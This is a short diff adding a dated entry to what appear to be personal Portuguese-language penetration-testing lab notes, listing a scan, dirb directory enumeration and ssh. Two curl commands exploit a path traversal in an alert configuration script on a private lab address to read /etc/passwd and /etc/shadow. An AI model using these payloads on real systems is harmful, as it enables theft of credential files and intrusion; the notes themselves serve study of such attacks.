@@ -137,3 +137,20 @@ Dia 5 			11/9/2020
 				
 				set payload
 				
+
+
+Dia 6 			12/9/2020
+
+	*scan
+	
+	*enumeração diretórios web
+		dirb 
+		
+	
+	*(manualemnte) curl
+		curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.100.9/administrator/alerts/alertConfigField.php?
+		
+		curl -s --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.100.9/administrator/alerts/alertConfigField.php?
+
+		
+	*ssh
